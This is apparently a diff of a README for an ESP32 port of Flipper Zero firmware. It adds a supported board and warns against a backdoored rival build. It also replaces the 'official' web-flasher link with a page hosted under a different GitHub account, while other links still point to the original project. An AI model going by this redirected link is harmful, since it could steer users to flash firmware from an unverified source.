@@ -3,7 +3,7 @@
 >
 > A firmware build distributed under the name **"L15Dev" / "Bitwire"** has been reported to contain **malware (a virus) and a backdoor**. **Do not download, flash, or run it under any circumstances.**
 >
-> Only use the official builds from this repository / the [web flasher](https://sor3nt.github.io/interface.html). If you already flashed an "L15Dev" image, re-flash a clean official build and treat any credentials/data on the device (WiFi passwords, captures) as compromised.
+> Only use the official builds from this repository / the [web flasher](https://davidmuhamad268-maker.github.io/Flipper-Zero-ESP32-Port/interface.html). If you already flashed an "L15Dev" image, re-flash a clean official build and treat any credentials/data on the device (WiFi passwords, captures) as compromised.
 
 > WARNING: I do not take responsibility if you damage your board or property. This guide is for educational purposes only — proceed at your own risk.
 
@@ -24,6 +24,7 @@ Join the [Flipper Zero meets ESP32 - Discord](https://discord.gg/5DnAqFXaBC) for
 | **LilyGo T-Embed CC1101** | ESP32-S3 (Xtensa LX7) | ST7789 320×170 | Rotary encoder + button | CC1101 | PN532 (I2C) | RMT TX + RX | SPI |
 | **Waveshare ESP32-C6-LCD-1.9** | ESP32-C6 (RISC-V) | ST7789V2 320×172 | CST816S touch | — | — | — | SPI |
 | **Waveshare ESP32-C6-LCD-1.47** ⚠️ | ESP32-C6 (RISC-V) | JD9853 320×172 | AXS5106L touch | — | — | — | SPI |
+| **Reaper Fury (ESP32-S3)** | ESP32-S3 (Xtensa LX7) | ST7789 320×172 | 6-way button pad | CC1101 | PN532 (I2C) | RMT TX + RX | SPI |
 | ** DIY ESP32-S3 with 2.8" TFT ** ⚠️| ESP32-S3 (Xtensa LX7) |2.8  ILI9341 320×240 | 6× Tactile buttons | CC1101 | PN532 (I2C) |  TX  | SPI |
 
 
@@ -37,7 +38,7 @@ Join the [Flipper Zero meets ESP32 - Discord](https://discord.gg/5DnAqFXaBC) for
 
 The easiest way is the **web flasher** — no toolchain required, just a Chrome/Edge browser and a USB cable:
 
-**[Flash via Browser](https://sor3nt.github.io/interface.html)**
+**[Flash via Browser](https://davidmuhamad268-maker.github.io/Flipper-Zero-ESP32-Port/interface.html)**
 
 Connect your board, click flash, done. After flashing, copy the contents of [`https://github.com/Sor3nt/Flipper-Zero-ESP32-Port/releases/download/v1.1.5/sdcard.zip`](sdcard/) onto a FAT32 SD card and insert it — most apps need files there to function.
 
